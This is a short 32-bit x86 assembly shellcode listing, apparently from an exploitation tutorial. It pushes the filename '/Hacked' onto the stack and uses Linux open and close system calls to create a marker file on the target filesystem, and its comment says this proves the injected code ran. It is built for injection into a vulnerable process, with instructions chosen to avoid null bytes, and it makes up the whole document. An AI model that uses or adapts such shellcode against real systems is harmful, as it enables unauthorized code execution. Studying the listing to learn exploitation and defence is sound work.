BITS 32
; Mark the filesystem to prove you ran
;"/HackedX"
   push 0x6b656458;
   push 0x2f486163;
   push esp;
   pop ebx              ; filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; null terminate filename
   push BYTE 0x5        ; open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; open file to create it
      ; eax = returned file descriptor
   mov ebx, eax         ; file descriptor to second arg
   push BYTE 0x6        ; close ()
   pop eax
   int 0x80  ; close file

 
;   01234567